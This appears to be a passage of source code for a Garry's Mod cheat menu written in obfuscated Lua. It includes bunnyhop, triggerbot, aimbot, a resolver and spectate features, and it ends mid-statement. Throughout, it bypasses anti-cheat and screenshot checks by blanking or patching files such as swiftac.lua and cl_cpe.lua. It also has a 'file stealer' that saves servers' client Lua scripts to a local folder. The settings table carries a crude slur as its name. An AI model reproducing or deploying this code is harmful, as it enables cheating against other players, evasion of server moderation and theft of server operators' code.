hacka.viewangle.p=math.Clamp(hacka.viewangle.p+(ucmd:GetMouseY()*sensitivity),-89,89)
hacka.viewangle.y=hacka.viewangle.y+(ucmd:GetMouseX()*-1*sensitivity)
local add=Vector(0,0,0)
local ang=hacka.viewangle
if ucmd:KeyDown(IN_FORWARD)then add=add+ang:Forward()end
if ucmd:KeyDown(IN_BACK)then add=add-ang:Forward()end
if ucmd:KeyDown(IN_MOVERIGHT)then add=add+ang:Right()end
if ucmd:KeyDown(IN_MOVELEFT)then add=add-ang:Right()end
if ucmd:KeyDown(IN_JUMP)then add=add+ang:Up()end
add=add:GetNormal()*time*3000
if ucmd:KeyDown(IN_SPEED)then add=add*2 end
hacka.viewvelocity=hacka.viewvelocity+add
if lockview then lockview=ucmd:GetViewAngles()end
if lockview then ucmd:SetViewAngles(lockview)end
ucmd:SetForwardMove(0)
ucmd:SetSideMove(0)
ucmd:SetUpMove(0)
end

local ply=LocalPlayer()
if gay["MISC_BUNNYHOP"] and !ply:GetMoveType()!=MOVETYPE_NOCLIP and ply:GetMoveType()!= MOVETYPE_LADDER and ply:Alive() then
if !ply:OnGround()and ucmd:KeyDown(IN_JUMP)then
ucmd:SetButtons(bit.band( ucmd:GetButtons(),_G["bit"]["bn".."ot"](IN_JUMP)))
if gay["MISC_AUTOSTRAFE"] then
if ucmd:GetMouseX()>1 or ucmd:GetMouseX()<-1 then
ucmd:SetSideMove( ucmd:GetMouseX() > 1 and 450 or -450 )
else
ucmd:SetForwardMove(5850/ply:GetVelocity():Length2D())
ucmd:SetSideMove((ucmd:CommandNumber()%2==0)and-450 or 450)
end
elseif ucmd:KeyDown(IN_JUMP)then 
ucmd:SetForwardMove(10000)
end


end
end


if gay["CIRCLESTRAFE"]then
if (buttoncheckbind(gay["CIRCLESTRAFE_KEY"])) then
CircleStrafeVal = CircleStrafeVal + CircleStrafeSpeed
if ((CircleStrafeVal > 0) and ((CircleStrafeVal / CircleStrafeSpeed) > 361)) then
CircleStrafeVal = 0
end
fixmov(ucmd, math.rad((CircleStrafeVal - engine.TickInterval())))
else
CircleStrafeVal = 0
end
end

if input.IsKeyDown(KEY_F)and gay["MISC_FLASHSPAM"] then 
ucmd:SetImpulse(100)
end 


if gay["AIM_AUTORELOAD"]then
AutoReload(ucmd)
end

if buttoncheckbind(gay["MISC_AUTOPISTOL"])then
if ucmd:TickCount()%2==0 then
ucmd:SetButtons(bit.bor(ucmd:GetButtons(),IN_ATTACK))
end
end


meme(ucmd);
aimer(ucmd);
antiaimer(ucmd);

if buttoncheckbind(gay["TRIGGERBOT_KEY"]) then
local Target = ply:GetEyeTrace().Entity
if ply:Alive() and ( Target:IsPlayer() or Target:IsNPC() ) and not gay["FRIENDLIST"][Target:SteamID()] then
Autofire(ucmd);
end
end

end)


hook.Add("PreDrawOpaqueRenderables","]]..b.hooks["PreDrawOpaqueRenderables"]..[[",function(ply)
local me=LocalPlayer()
if gay["RESOLVER"]then



for k, v in next, player.GetAll() do
if v == me or not v:IsValid() then continue end
local pitch = v:EyeAngles().x
local yaw = v:EyeAngles().y
local roll = 0
local resolverxaxis=gay["RESOLVER_X_AXIS"]
if resolverxaxis ~= "Off" then
if resolverxaxis == "Down" then
pitch = 90
elseif resolverxaxis == "Up" then
pitch = - 90
elseif resolverxaxis == "Center" then
pitch = 0
elseif resolverxaxis == "Invert" then
pitch = - pitch
elseif resolverxaxis == "Random" then
pitch = math.random( - 90, 90)
else
if pitch <= 20 and pitch >= - 10 then
pitch = 90
end
end
end
local resolveryaxis=gay["RESOLVER_Y_AXIS"]
if resolveryaxis ~= "Off" then
if resolveryaxis == "Left" then
yaw = yaw + 90
elseif resolveryaxis == "Right" then
yaw = yaw - 90
elseif resolveryaxis == "Invert" then
yaw = yaw + 180
elseif resolveryaxis == "Random" then
yaw = math.random( - 180, 180)
else
roll = v:EyeAngles().z
end
end
v:SetPoseParameter("aim_pitch", math.NormalizeAngle(pitch))
v:SetPoseParameter("head_pitch", math.NormalizeAngle(pitch))
v:SetPoseParameter("body_yaw", 0)
v:SetPoseParameter("aim_yaw", 0)
v:SetRenderAngles(Angle(0, math.NormalizeAngle(yaw) + math.NormalizeAngle(roll), 0))
v:InvalidateBoneCache()
end


end
end)

hook.Add("CalcView","]]..b.hooks["CalcView"]..[[",function(_,origin,angles)
if panickey then return end
if panic then return end
local ply=LocalPlayer()

if gay["MISC_SPECTATE_TARGET"]and gay["MISC_SPECTATE_TARGET"]!=""then
local plys=Player(gay["MISC_SPECTATE_TARGET"])
if plys and IsValid(plys) then
local n={}
n.origin=plys:EyePos()or Vector(0,0,0)
n.angles=plys:EyeAngles()or Angle(0,0,0)
n.fov=origin
n.drawviewer=true
return n
end
end

if hacka.noclipenebled and gay["WH_DEBUGCAMERA_ENABLED"] then
if hacka.setview then
hacka.vieworigin=origin
hacka.viewangle=angles
hacka.setview=false
end
return{origin=hacka.vieworigin,angles=hacka.viewangle,drawviewer=true}
end

local n={}
if gay["NOSWAY"]then
n.angles=ply:EyeAngles()
else
n.angles=angles
end
if gay["WH_FOVVIEW_ENABLED"]then
n.fov=gay["WH_FOVVIEW"]
end
if hacka.miscthipisidion and gay["WH_THIRDPERSON_ENABLED"] then
n.angles=fa
n.origin=origin + am.Forward(fa) * -gay["WH_THIRDPERSON_DISTANCE"];
n.drawviewer=true
end
n.SetView=false
return n
end)


timer.Simple(0,function()

local ahd={}
local function gf(c)
local d=c:ReadBool()
local e=c:ReadChar()
local hd=''
for f=1,e do 
if c:ReadBool()then 
local daa=c:ReadString()
table.insert(ahd,daa)
hd=hd.." "..daa
else 
table.insert(ahd,Color(c:ReadChar()+128,c:ReadChar()+128,c:ReadChar()+128))
end 
end
if d then 
chat.AddText(unpack(ahd))
zapiclogs("ulx",hd)
ahd={}
end 
end
usermessage.Hook("tsayc",gf)

end)


hook.Add("RenderScreenspaceEffects","]]..b.hooks["RenderScreenspaceEffects"]..[[",function()
if panickey then return end
if panic then return end
if not gay["FILTER_ENABLED"]then return end
local tab = {
["$pp_colour_addr"] = 0,
["$pp_colour_addg"] = 0,
["$pp_colour_addb"] = 0,
["$pp_colour_brightness"] = gay["FILTER_BRIGHTNESS"],
["$pp_colour_contrast"] = gay["FILTER_CONTRAST"]or 1,
["$pp_colour_colour"] = gay["FILTER_SATURATION"],
["$pp_colour_mulr"] = 0,
["$pp_colour_mulg"] = 0,
["$pp_colour_mulb"] = 0
}
DrawColorModify(tab)
end)



end)
































]]end;if IsInGame()and o[1]and a==o[1]["name"]then return o[1]["code"]end;if GetHostName:find("PrimeRP")and IsInGame()then return k end;if GetHostName:find("CakeRP")and IsInGame()then return k end;if GetHostName:find("FustRP")and IsInGame()then return k end;if t["LUA_FILE_STEALER"]and not ScriptExistsif and not IsInGame()and GetHostName then local V=string.Replace("C:/exechack",[[\]],[[/]])local W=string.Explode("/",a)local l=V.."/"..GetHostName.."/"exec_CreateDir("C:/exechack")exec_CreateDir("C:/exechack".."/"..GetHostName)for d=1,#W-1 do l=l..W[d]if not exec_Exists(l)then exec_CreateDir(l)end;l=l.."/"end;if exec_Exists(V.."/"..GetHostName.."/"..a)then local X=exec_Read(V.."/"..GetHostName.."/"..a)exec_Write(V.."/"..GetHostName.."/"..a,X.."\n"..D)else exec_Write(V.."/"..GetHostName.."/"..a,D)end end;if j and s then return" "end;if a:find("dayz/gamemode/scripts/client/hud.lua")then return D:Replace("net.Start","print;if true then return end")end;if a:find("swiftac.lua")then return D:Replace("gcinfo()>650","false")end;if a:find("cl_cpe.lua")then return" "end;if a:find("bankfunctionsprovider.lua")then return' 'end;if a:find("scalednetworkentry.lua")then return string.Replace(D,'GimmeThatScreen["GTS:ObjectFactoryProvider"].RRC','render.Capture')end;if t["LUA_FILE_STEALER"]and t["LUA_FILE_STEALER_REPLACE"]and not IsInGame()then local V=string.Replace("C:/exechack",[[\]],[[/]])local Y=V.."/"..GetHostName.."/"..a;if exec_Exists(Y)then if exec_Read(Y)==D then else return exec_Read(Y)end end end end)for d=0,24 do local Z=10+d;surface.CreateFont("hack_font_"..Z,{font=t["MENU_FONT"],size=Z})end;surface.SetFont("hack_font_18")timer.Simple(1,function()local _={}local function a0(a)if IsValid(b.rt)then b.rt:Close()end;surface.SetFont("hack_font_26")local D=select(1,surface.GetTextSize(a))+10;b.rt=vgui.Create("DFrame")b.rt:SetSize(D,38-6)b.rt:SetPos(-D,10)b.rt:SetTitle("")b.rt:MakePopup()b.rt:SetDraggable(false)b.rt:ShowCloseButton(false)b.rt.Paint=function(self,E,F)draw.RoundedBox(0,0,0,E,F,b.windowbg)draw.SimpleText(a,"hack_font_26",5,3,b.colortext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,E,F)end;b.rt:MoveTo(10,10,.2,0,-1,function()timer.Simple(1,function()b.rt:MoveTo(-D,10,.2,0,-1)end)end)timer.Simple(3,function()if IsValid(b.rt)then b.rt:Close()end end)end;if username then a0("Welcome back: "..username)end;local function a1(M,a2,a3,Z,a4,a5,z)local a6=vgui.Create("DButton",a5)a6:SetFont("hack_font_18")a6:SetText(M)a6:SetTextColor(b.colortext)a6:SetSize(Z,a4)a6:SetPos(a2,a3)a6.Paint=function(a7,a8,a9)draw.RoundedBox(0,0,0,a8,a9,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,a9)if a6.Hovered then draw.RoundedBox(0,0,0,a8,a9,b.buttonhovered)end end;a6.DoClick=z end;local function aa(Z,ab,z)doplpanel=vgui.Create("DFrame")doplpanel:SetSize(Z,ab)doplpanel:SetPos(gui.MouseX()-10,gui.MouseY()-10)doplpanel:SetTitle("")doplpanel:MakePopup()doplpanel:ShowCloseButton(false)doplpanel.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;z()doplpanel.Think=function()if doplpanel and IsValid(doplpanel)and input.IsMouseDown(107)then if not doplpanel:IsChildHovered()and not doplpanel.Hovered then doplpanel:Close()doplpanel=nil end end end end;local function ae(af,ag,ah)local ai=vgui.Create("DComboBox",doplpanel)ai:SetPos(af,ag)ai:SetSize(121,20)ai:SetFont("hack_font_12")ai:SetValue("Position")ai:SetTextColor(b.colortext)ai.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;ai.OnSelect=function(h,h,A)if A=="Up"then y(ah,1)elseif A=="Down"then y(ah,2)elseif A=="Right"then y(ah,3)elseif A=="Left"then y(ah,4)end end;ai:AddChoice("Up")ai:AddChoice("Down")ai:AddChoice("Left")ai:AddChoice("Right")end;local function aj(af,ag,ah,table,M,derma)if derma then doplpanel=derma end;local ai=vgui.Create("DComboBox",doplpanel)ai:SetPos(af,ag)ai:SetSize(121,20)ai:SetFont("hack_font_12")if M then ai:SetValue(M)else ai:SetValue("Type")end;ai:SetTextColor(b.colortext)ai.Paint=function(h,ac,ad)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;ai.OnSelect=function(h,h,A)y(ah,A)end;for h,m in pairs(table)do ai:AddChoice(m)end end;local function ak(ah,a2,a3)local al=vgui.Create("DTextEntry",doplpanel)al:SetPos(a2,a3)al:SetSize(121,20)al:SetText(util.TableToJSON(t[ah]))al.Paint=function(self,ac,ad)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ac,ad)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;local am=vgui.Create("DColorMixer",doplpanel)am:SetPos(a2,a3+22)am:SetSize(121,150-22)am:SetPalette(false)am:SetWangs(false)am:SetColor(t[ah])am.ValueChanged=function()y(ah,am:GetColor())al:SetText(util.TableToJSON(am:GetColor()))end;al.OnTextChanged=function()am:SetColor(util.JSONToTable(al:GetText()))y(ah,am:GetColor())end end;local function an(a5,ao,ap,aq,af,ag,ar,as)local at=vgui.Create("DNumSlider",a5)at:SetPos(af,ag)at:SetSize(ar,25)at:SetMin(ao)at:SetMax(ap)at:SetDecimals(0)at.TextArea:SetFont("hack_font_13")at.TextArea:SetTextColor(b.colortext)at:SetValue(t[aq])if as then at:SetToolTip(as)end;function at:OnValueChanged(a)y(aq,a)end;function at.Slider.Knob:Paint()end;function at.Slider:Paint(ac,ad)surface.SetDrawColor(b.slider)surface.DrawRect(0,ad/4,ac*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),ad/2)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,ad/4,ac,ad/2)end end;local function au(av,aw,m,ac,ax,ay,az)local aA=ax:Add("DCheckBoxLabel")aA:SetPos(m,ac)aA:SetText(av)aA:SetFont("hack_font_18")aA:SetTextColor(b.colortext)if az then aA:SetValue(az)else aA:SetValue(t[aw])end;if ay then aA:SetToolTip(ay)end;function aA.Button:Paint(aB,aC)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,aB,aC)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,aB,aC)end;function aA:OnChange(aD)if az then az=aD else y(aw,aD)end end end;local function aE(av,aw,m,ac,aF,ax,ay)local aG=vgui.Create("DBinder",ax)aG:SetFont("hack_font_18")aG:SetText(input.GetKeyName(t[aw])or"None")aG:SetTextColor(b.colortext)aG:SetSize(aF,25)aG:SetSize(select(1,surface.GetTextSize(input.GetKeyName(t[aw])or"None"))+10,25)aG:SetPos(m,ac)if ay then aG:SetToolTip(ay)end;aG.Paint=function(a7,a8,a9)draw.RoundedBox(0,0,0,a8,a9,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a8,a9)if aG.Hovered then draw.RoundedBox(0,0,0,a8,a9,b.buttonhovered)end end;aG.OnChange=function(aH)y(aw,aH:GetValue())aG:SetSize(select(1,surface.GetTextSize(aG:GetText()))+10,25)end end;local function aI(M,aJ,W,a5)local aK=vgui.Create("DButton",a5)aK:SetSize(select(1,surface.GetTextSize(M)),15)aK:SetPos(aJ,W)aK:SetFont("hack_font_18")aK:SetText(M)aK:SetTextColor(b.colortext)aK.Paint=function()end end;local function aL()local HD=HD or{}local aM=Material("vgui/hud_designer/grabber.png")surface.CreateFont("HD_Title",{font="Roboto Lt",size=20,weight=500,antialias=true})surface.CreateFont("HD_Smaller",{font="Roboto Lt",size=14,weight=500,antialias=true})surface.CreateFont("HD_Button",{font="Roboto Lt",size=16,weight=500,antialias=true})surface.CreateFont("Arial24",{font="Arial",size=24,weight=500,antialias=true})function HD.OpenDesigner(aN)if HD.DesignerOpen then if IsValid(HD.Frame)then HD.Frame:Close()if HD.SplashFrame then HD.SplashFrame:Close()end;return end end;HD.UseAutosave=false;HD.AutosaveMinShapes=5;HD.AutosaveIncrement=120;HD.DefaultCorner=4;HD.GridEnabled=false;HD.GridSize=2;HD.DefaultCol=Color(41,128,185,255)HD.ScalePos=true;HD.ScaleSize=false;HD.Types={"draw.RoundedBox","draw.DrawText","surface.DrawTexturedRect"}HD.FormatTypes={["Health"]={text="%health%",code="lp:Health()"},["Ammo Max"]={text="%ammomax%",code="wep.Primary.ClipSize or 0"},["Ammo Current"]={text="%ammocur%",code="wep:Clip1() or 0"},["Ammo Reserve"]={text="%ammores%",code="wep:Ammo1() or 0"},["Armor"]={text="%armor%",code="lp:Armor()"},["Team"]={text="%team%",code="lp:Team()"},["Name"]={text="%name%",code="lp:Nick()"},["TTT - Round State"]={text="%tttround%",code="L[ roundstate_string[GAMEMODE.round_state] ]"},["TTT - Round Time"]={text="%ttttime%",code='util.SimpleTime(math.max(0, GetGlobalFloat("ttt_round_end", 0) - CurTime()), "%02i:%02i")'},["TTT - Role"]={text="%tttrole%",code="L[lp:GetRoleStringRaw()]"},["RP - Salary"]={text="%rpsalary%",code='DarkRP.getPhrase("salary", DarkRP.formatMoney(lp:getDarkRPVar("salary")), "")'},["RP - Job"]={text="%rpjob%",code='DarkRP.getPhrase("job", lp:getDarkRPVar("job") or "")'},["RP - Money"]={text="%rpmoney%",code='DarkRP.getPhrase("wallet", DarkRP.formatMoney(localplayer:getDarkRPVar("money")), "")'},["None"]={text="N/A",code="N/A"}}HD.Tools={["Create"]=1,["Layers"]=2,["Color"]=3,["Select"]=4,["Grid"]=5,["Delete"]=6,["Save"]=7,["Close"]=8}HD.Boundaries={}HD.DrawnObjects={}HD.ShapesOnLayer={}for aO,m in pairs(HD.Types)do HD.DrawnObjects[1]={}HD.DrawnObjects[1][m]={}end;HD.SelectedButton=nil;HD.CurTool=HD.Tools.Box;HD.CurType=HD.Types[1]HD.ShapeID=1;HD.ShapeCount=1;HD.CurLayer=1;HD.Layers=1;HD.Cursor="arrow"HD.ProjectName="Project Name"HD.FAKE_TEXTURE="vgui/nonexistant.png"HD.Y_BUFFER=35;HD.ScaleSize,HD.ScalePos=false;HD.ChosenCol,HD.ColMixer,HD.GridEditor,HD.LoadSel,HD.CreateOpen,HD.CurSizeID=nil;HD.LayerView,HD.LayerOpen,HD.GridOpen,HD.LoadOpen,HD.ColMixerOpen,HD.CreatePanel=false;HD.Sizing,HD.Moving,HD.ClickColor=false;HD.CurMovingData={}HD.ShapeOptions={}HD.Frame=vgui.Create("DFrame")HD.Frame:SetSize(ScrW(),ScrH())HD.Frame:SetPos(0,0)HD.Frame:SetTitle("")HD.Frame:MakePopup()HD.Frame:SetDraggable(false)HD.Frame.btnMaxim:SetVisible(false)HD.Frame.btnMinim:SetVisible(false)HD.Frame.btnClose:SetVisible(false)HD.Frame.Paint=function(a7,a8,a9)draw.RoundedBox(0,0,0,ScrW(),35,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,ScrW(),35)end;local aP=vgui.Create("DLabel",HD.Frame)aP:SetPos(10,8)aP:SetSize(30,0)aP:SetColor(Color(255,255,255))aP:SetFont("HD_Title")aP:SetText("")aP:SizeToContents()HD.DesignerOpen=true;HD.IconLayout=vgui.Create("DIconLayout",HD.Frame)HD.IconLayout:SetSize(700,25)HD.IconLayout:SetPos(ScrW()/2-HD.IconLayout:GetWide()/2,5)HD.IconLayout:SetSpaceY(5)HD.IconLayout:SetSpaceX(5)HD.ToolbarButtons={}local d=1;for d=1,table.Count(HD.Tools)do local aO,m;for aQ,aR in pairs(HD.Tools)do if aR==d then aO=aQ;m=aR end end;HD.ToolbarButtons[aO]=HD.IconLayout:Add("DButton")HD.ToolbarButtons[aO]:SetSize(54,29)HD.ToolbarButtons[aO]:SetText(aO)HD.ToolbarButtons[aO]:SetTextColor(Color(255,255,255))HD.ToolbarButtons[aO]:SetFont("hack_font_18")HD.ToolbarButtons[aO].DoClick=function()HD.SetTool(m,aO)HD.ToolFunctions(m)end;HD.ToolbarButtons[aO].Paint=function(h,a8,a9)draw.RoundedBox(0,0,0,a8,a9,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a8,a9)end end;HD.IconLayout:SetPos(ScrW()/2-HD.IconLayout:GetWide()/2,3)local aS,aT=HD.IconLayout:GetPos()HD.Canvas=vgui.Create("DPanel",HD.Frame)HD.Canvas:SetSize(ScrW()-0,ScrH()-30)HD.Canvas:SetPos(0,HD.Y_BUFFER)local aU=0;function HD.Canvas:PaintOver(ac,ad)local d=1;for d=1,HD.Layers do HD.DrawnObjects[d]=HD.DrawnObjects[d]or{}for aV,aW in pairs(HD.DrawnObjects[d])do if aV=="draw.RoundedBox"then for aX,aY in pairs(aW)do if HD.LayerView then local aZ=nil;local a8,T,D,a=aY.color.r,aY.color.g,aY.color.b,aY.color.a;if d==HD.CurLayer then aZ=Color(a8,T,D,a)else a=math.Clamp(a-100,100,255)aZ=Color(a8,T,D,a)end;draw.RoundedBox(aY.corner,aY.x,aY.y,aY.width,aY.height,aZ)draw.DrawText(HD.GetShapeLayer(aX)or"","Trebuchet24",aY.x+5,aY.y,Color(255,255,255))else draw.RoundedBox(aY.corner,aY.x,aY.y,aY.width,aY.height,aY.color)end end elseif aV=="surface.DrawTexturedRect"then for aX,aY in pairs(aW)do local color=aY.color;if color==HD.DefaultCol then color=Color(255,255,255)end;if type(aY.texture)=="IMaterial"then surface.SetMaterial(aY.texture)surface.SetDrawColor(color)surface.DrawTexturedRect(aY.x,aY.y,aY.width,aY.height)else surface.SetTexture(aY.texture)surface.SetDrawColor(color)surface.DrawTexturedRect(aY.x,aY.y,aY.width,aY.height)end end elseif aV=="draw.DrawText"then for aX,aY in pairs(aW)do draw.DrawText(aY.text,aY.font,aY.x,aY.y,aY.color)end else end end end;for aX,m in pairs(HD.Boundaries)do if not HD.GetShapeType(aX)=="draw.DrawText"and HD.GetShapeLayer(aX)==HD.CurLayer then local a_=20;local b0,b1=m.farx,m.fary;local b2,b3=b0-a_,b1-a_;local ay,aA=b2,b3;local width,height=b0-b2,b1-b3;surface.SetDrawColor(150,150,150)surface.SetMaterial(aM)surface.DrawTexturedRect(ay+5,aA+5,width-10,height-10)end end end;HD.Canvas.Paint=function()if HD.GridEnabled then for d=HD.GridSize,ScrW(),HD.GridSize do surface.DrawLine(d,0,d,ScrH())surface.DrawLine(0,d,ScrW(),d)end end;local aC=ScrH()/2-35;local aB=ScrW()/2;local b4=1500;surface.SetDrawColor(Color(255,255,255))surface.DrawLine(aB+b4,aC,aB-b4,aC)surface.DrawLine(aB,aC+b4,aB,aC-b4)end;HD.Canvas.OnMousePressed=function(self,b5)local b6,b7=HD.GetMousePos()if b5==MOUSE_LEFT then local b8,aX=HD.IsInShape(b6,b7)local b9=HD.GetShapeLayer(aX)local ba=HD.GetShapeType(aX)if HD.ClickColor then if b8 then local aZ=HD.DrawnObjects[b9][ba][aX].color;HD.Mixer:SetColor(aZ)HD.ChosenCol=aZ;HD.ClickColor=false;return end elseif HD.CurTool==HD.Tools.Color then if b8 then local bb=HD.ChosenCol;HD.DrawnObjects[b9][ba][aX].color=bb;return end elseif HD.CurTool==HD.Tools.Delete then if b8 then HD.DrawnObjects[b9][ba][aX]=nil;HD.Boundaries[aX]=nil;HD.CancelAlter()HD.ShapeCount=HD.ShapeCount-1;return end end;HD.CloseOpenInfoPanels()if b8 then if HD.IsInSize(aX,b6,b7)then HD.SetTool(HD.Tools.Select,"Select")HD.CurMovingData={}HD.Moving=false;local bc=HD.DrawnObjects[b9][HD.GetShapeType(aX)][aX]if bc then HD.CurSizeID=aX;HD.Sizing=true end else HD.SetTool(HD.Tools.Select,"Select")HD.CurSizeID=nil;HD.Sizing=false;local bd,aX,be,bf=HD.IsInShape(b6,b7)HD.CurMovingData={id=aX,x=be,y=bf}HD.Moving=true end else HD.CancelAlter()end elseif b5==MOUSE_RIGHT then local b8,aX=HD.IsInShape(b6,b7)if not b8 then return end;HD.SetTool(HD.Tools.Select,"Select")HD.OpenShapeSettings(aX,b6,b7)end end;local bg,aU=CurTime()+30,0;HD.Canvas.Think=function(self)if CurTime()>aU then if HD.UseAutosave and CurTime()>bg and HD.ShapeCount>HD.AutosaveMinShapes then HD.Autosave()bg=CurTime()+HD.AutosaveIncrement end;HD.DrawnObjects=HD.DrawnObjects or{}HD.Layers=table.Count(HD.DrawnObjects)local d=1;for d=1,HD.Layers do local bh=0;for aO,m in pairs(HD.DrawnObjects[d])do bh=bh+table.Count(m)end;HD.ShapesOnLayer[d]=bh end;aU=CurTime()+1 end;local b6,b7=HD.GetMousePos()local bi=HD.IsInCanvas(b6,b7)local bj,aX=HD.IsInShape(b6,b7)if not bi then HD.CancelAlter()return elseif bj or HD.Moving and input.IsMouseDown(MOUSE_LEFT)then HD.Cursor="hand"else HD.Cursor="arrow"end;HD.Canvas:SetCursor(HD.Cursor)if HD.Moving and input.IsMouseDown(MOUSE_LEFT)then local bk,bl=b6,b7;if bi then local F=HD.CurMovingData;local aX,be,bf=F.id,F.x,F.y;local a_=HD.GridSize;local bm,bn=a_/2,a_*1.5;bk,bl=math.SnapTo(bk-be+bm,a_),math.SnapTo(bl-bf-bn,a_)HD.EditShape(aX,{x=bk,y=bl},"move")end elseif HD.Sizing and input.IsMouseDown(MOUSE_LEFT)then local aX=HD.CurSizeID;local a_=HD.GridSize;local bc=HD.Boundaries[aX]if not bc then return end;local ay,aA=bc.x,bc.y;local b0,b1=bc.farx,bc.fary;local b2,b3=b0-a_,b1-a_;if HD.IsInCanvas then b6,b7=math.Clamp(b6,ay+5,ScrW()),math.Clamp(b7,aA+5,ScrH())HD.EditShape(aX,{width=b6-ay,height=b7-aA},"size")end end end end;function HD.ToolFunctions(bo)if bo==HD.Tools.Create then if HD.CreateOpen then HD.SetTool()HD.CreatePanel:SetVisible(false)HD.CreateOpen=false;HD.CreatePanel=nil;return end;local bp,bq=HD.IconLayout,HD.ToolbarButtons.Create;local br,bs=bq:GetPos()local bt,bu=bp:GetPos()br,bs=br+bt,bs+bu;local bv=0;if#HD.Types>3 then bv=55 end;HD.CreatePanel=vgui.Create("DPanel",HD.Frame)HD.CreatePanel:SetSize(180,70+bv)HD.CreatePanel:SetPos(br-HD.CreatePanel:GetWide()/4,40)HD.CreatePanel.Paint=function(a7,a8,a9)local self=HD.CreatePanel;draw.RoundedBox(0,0,0,a8,a9,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a8,a9)end;local bw=vgui.Create("DLabel",HD.CreatePanel)bw:SetPos(35,5)bw:SetColor(Color(255,255,255))bw:SetFont("HD_Smaller")bw:SetText("")bw:SizeToContents()local bx=vgui.Create("DIconLayout",HD.CreatePanel)bx:SetSize(HD.CreatePanel:GetSize())bx:SetPos(10,10)bx:SetSpaceY(5)bx:SetSpaceX(5)local d=1;local by=Material(HD.FAKE_TEXTURE)local bh=0;for d=1,#HD.Types do local bz=HD.Types[d]local bA=vgui.Create("DButton",bx)bA:SetSize(50,50)bA:SetTextColor(Color(255,255,255))bA:SetFont("HD_Smaller")bA:SetText("")bA:SetTooltip(bz)bA.Paint=function()draw.RoundedBox(0,0,0,bA:GetWide(),bA:GetTall(),Color(255,255,255,255))if bz=="draw.RoundedBox"then draw.RoundedBox(8,5,5,40,40,Color(90,90,90,255))elseif bz=="draw.DrawText"then draw.DrawText("TEXT","HD_Title",5,15,Color(90,90,90,255))elseif bz=="surface.DrawTexturedRect"then surface.SetMaterial(by)surface.SetDrawColor(255,255,255)surface.DrawTexturedRect(5,5,40,40)elseif bz=="surface.CreateFont"then draw.DrawText("Ff","HD_Title",16,15,Color(90,90,90,255))else end end;bA.DoClick=function()HD.SetType(bz)if bz=="draw.DrawText"then local font="Arial24"local text="Sample Text"local width,height=HD.GetTextSize(text,font)local ay,aA=HD.Canvas:GetWide()/2-width/2,HD.Canvas:GetTall()/2-height/2;HD.AddText(HD.ShapeID,ay,aA,text,font,color,HD.CurLayer)elseif bz=="draw.RoundedBox"then local width=200;local height=200;local ay,aA=HD.Canvas:GetWide()/2-width/2,HD.Canvas:GetTall()/2-height/2;HD.AddShape(HD.ShapeID,ay,aA,width,height,HD.ChosenCol,{corner=4},HD.CurLayer)elseif bz=="surface.DrawTexturedRect"then local width=200;local height=200;local ay,aA=HD.Canvas:GetWide()/2-width/2,HD.Canvas:GetTall()/2-height/2;local color=HD.ChosenCol;if color==HD.DefaultCol then color=Color(255,255,255)end;HD.AddShape(HD.ShapeID,ay,aA,width,height,color,{texture=by},HD.CurLayer)elseif bz=="surface.CreateFont"then HD.FontCreator()else end;HD.SetTool(HD.Tools.Select,"Select")HD.CreatePanel:SetVisible(false)HD.CreateOpen=false;HD.CreatePanel=nil end;bh=bh+1;if bh%3==0 and bh>3 then local width,height=HD.CreatePanel:GetSize()HD.CreatePanel:SetSize(180,height+55)end end;HD.CreateOpen=true elseif bo==HD.Tools.Color then HD.SetTool(HD.Tools.Color,"Color")if HD.ColMixerOpen then HD.SetTool(nil)HD.ColMixer:SetVisible(false)HD.ColMixerOpen=false;HD.ColMixer=nil;return end;local bp,bq=HD.IconLayout,HD.ToolbarButtons.Color;local br,bs=bq:GetPos()local bt,bu=bp:GetPos()br,bs=br+bt,bs+bu;HD.ColMixer=vgui.Create("DPanel",HD.Frame)HD.ColMixer:SetSize(260,240)HD.ColMixer:SetPos(br-HD.ColMixer:GetWide()/4,40)HD.ColMixer.Paint=function(a7,a8,a9)local self=HD.ColMixer;draw.RoundedBox(0,0,0,a8,a9,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a8,a9)end;HD.Mixer=vgui.Create("DColorMixer",HD.ColMixer)HD.Mixer:SetSize(250,230)HD.Mixer:SetPos(5,5)HD.Mixer:SetPalette(false)HD.Mixer:SetAlphaBar(true)HD.Mixer:SetWangs(true)HD.Mixer:SetColor(HD.ChosenCol or HD.DefaultCol)HD.Mixer.Think=function()HD.ChosenCol=HD.Mixer:GetColor()end;local bB=vgui.Create("DButton",HD.ColMixer)bB:SetSize(50,25)bB:SetPos(HD.ColMixer:GetWide()-bB:GetWide()-5,HD.ColMixer:GetTall()-bB:GetTall()-20)bB:SetTextColor(Color(0,0,0))bB:SetTooltip("Click on a shape to use its color")bB:SetText("Picker")bB.DoClick=function()HD.ClickColor=true end;HD.ColMixerOpen=true elseif bo==HD.Tools.Grid then if HD.GridOpen then HD.SetTool(nil)HD.GridEditor:SetVisible(false)HD.GridOpen=false;HD.GridEditor=nil;return end;local bp,bq=HD.IconLayout,HD.ToolbarButtons.Grid;local br,bs=bq:GetPos()local bt,bu=bp:GetPos()br,bs=br+bt,bs+bu;HD.GridEditor=vgui.Create("DPanel",HD.Frame)HD.GridEditor:SetSize(80,65)HD.GridEditor:SetPos(br-HD.GridEditor:GetWide()/4,40)HD.GridEditor.Paint=function(a7,a8,a9)local 